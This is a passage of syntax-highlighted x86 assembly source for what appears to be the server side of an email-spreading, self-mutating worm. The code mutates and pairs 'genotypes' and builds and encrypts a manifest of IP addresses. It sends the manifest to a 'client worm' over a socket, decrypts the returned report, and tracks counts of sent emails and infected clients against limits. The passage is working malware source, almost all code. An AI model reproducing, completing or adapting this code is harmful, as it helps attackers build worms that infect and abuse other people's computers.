    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;save address of old genotype as argument</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_PAIRGENOTYPES</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">        </span><span class="sc1">;pair these genotypes into one</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;new genotype ptr to EBX</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_MUTATEGENOTYPE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;mutate this genotype</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">st_mem_genotype</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">          </span><span class="sc1">;deallocate genotype memory</span><span class="sc0">


    </span><span class="sc1">;CREATE MANIFEST BASED ON NEW GENOTYPE AND IP STORAGE...</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edx.MAN_IPSNUM</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">edx.MAN_IPSPTR</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">;number of bytez for IPs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">;8-byte for manifest header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; + size of genotype</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_newmanifestsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">                </span><span class="sc1">;allocate memory of calculated size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_newmanifest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save address</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;EAX = size of genotype</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;ECX = EAX</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">;EAX += 8 (header size)</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;save relative ptr to IPs</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">;save count of IPs</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;copy genotype</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;get ptr to IPs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;get count of IPs</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">                   </span><span class="sc1">;copy IPs</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">              </span><span class="sc1">;deallocate genotype memory</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">               </span><span class="sc1">;the flag - client worm sent</span><span class="sc0">
</span><span class="sc5">st_genotype_only</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;only genotype, replace old</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">replace_manifest</span><span class="sc0">            </span><span class="sc1">;manifest with the new one</span><span class="sc0">
                            </span><span class="sc1">;and close connection with client</span><span class="sc0">
                            </span><span class="sc1">;(broadcast case)</span><span class="sc0">
    </span><span class="sc1">;ENCRYPT THE MANIFEST IN MEMORY</span><span class="sc0">


    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_man_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">               </span><span class="sc1">;ECX = size of whole plaintext</span><span class="sc0">
</span><span class="sc5">st_newmanifestsize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">;round the size</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">                     </span><span class="sc1">;of the buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">                 </span><span class="sc1">;on an encrypted block size</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;(EAX *= 80h/70h)</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alloc_memory</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">key_server_loop</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">75h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;EBX = plain text block size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_newmanifest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;ESI = start of manifest in memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">st_crypt_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;copy plaintext over the buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">st_crypt_final</span><span class="sc0">              </span><span class="sc1">;is it last block?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">st_crypt_final</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_encrypt</span><span class="sc0">               </span><span class="sc1">;encrypt one block</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_man_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">st_crypt_loop</span><span class="sc0">               </span><span class="sc1">;correct variablez and continue</span><span class="sc0">



</span><span class="sc5">replace_manifest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_newmanifest</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MANIFEST</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_newmanifestsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_manifest</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">key_server_loop</span><span class="sc0">



</span><span class="sc1">;encrypt the last block</span><span class="sc0">

</span><span class="sc5">st_crypt_final</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_encrypt_final</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">st_man_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;ECX = size of encrypted manifest</span><span class="sc0">


    </span><span class="sc1">;SEND ENCRYPTED MANIFEST TO CLIENT WORM</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">protocol_MAGIC</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDMANIFEST</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send header to worm</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_socket</span><span class="sc0">            </span><span class="sc1">;send manifest to worm</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">


    </span><span class="sc1">;RECIEVE ENCRYPTED REPORT AND DECRYPT IT</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response5</span><span class="sc0">           </span><span class="sc1">;get response</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">key_server_loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">st_newmanifest</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dealloc_memory</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">WORMNET_SENDREPORT</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">key_server_loop</span><span class="sc0">         </span><span class="sc1">;must be WORMNET_SENDREPORT</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@report</span><span class="sc4">-</span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response</span><span class="sc0">            </span><span class="sc1">;recieve report</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">key_server_loop</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_CryptDecrypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;decrypt last block</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_response5</span><span class="sc0">           </span><span class="sc1">;synchronization with client</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GEN_CUSTOM</span><span class="sc0">          </span><span class="sc1">;activate custom routine stored</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">activate_gen</span><span class="sc0">            </span><span class="sc1">;in genotype</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">num_of_clients</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc1">;increment "number of handled clients"</span><span class="sc0">
                        </span><span class="sc1">;variable</span><span class="sc0">

    </span><span class="sc1">;ANALYSE REPORT AND STATUS VARIABLES</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.REP_MAILNUM</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get number of sent emails</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">             </span><span class="sc1">;get limit variable</span><span class="sc0">
</span><span class="sc5">mut_mailnum</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">st_terminate</span><span class="sc0">            </span><span class="sc1">;quit if limit exceeded</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.REP_IPSNUM</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get number of IPs stored in client's manifest</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">             </span><span class="sc1">;get limit variable</span><span class="sc0">
</span><span class="sc5">mut_ipsnum</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">st_terminate</span><span class="sc0">            </span><span class="sc1">;quit if limit exceeded</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">;get number of handled clients</span><span class="sc0">
</span><span class="sc5">num_of_clients</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">             </span><span class="sc1">;get limit variable</span><span class="sc0">
</span><span class="sc5">mut_clientnum</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">st_terminate</span><span class="sc0">            </span><span class="sc1">;quit if limit exceeded</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_GetTickCount</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get current count of ticks</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">           </span><span class="sc1">; - saved count of ticks</span><span class="sc0">
</span><span class="sc5">st_ticks</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; / 60 seconds (convert miliseconds to minutes)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Dh</span><span class="sc0">         </span><span class="sc1">;CMP    EAX,LARGE ...</span><span class="sc0">
</span><span class="sc5">mut_time</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">30</span><span class="sc0">          </span><span class="sc1">; ... 30</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">key_server_loop</span><span class="sc0">         </span><span class="sc1">;quit if running longer than 30 minutes</span><span class="sc0">


    </span><span class="sc1">;TERMINATE SERVER</span><span class="sc0">


</span><span class="sc5">st_terminate</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">st_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get instruction to patch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">90909090h</span><span class="sc0">           </span><span class="sc1">;4 x NOP (90h)</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;overwrite 4 bytez with NOPs</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;overwrite 1 byte with NOP</span><span class="sc0">



</span><span class="sc5">key_server_loop</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;destroy client's public key</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cXchgKey</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tgdelta</span><span class="sc4">]</span><span class="sc0">
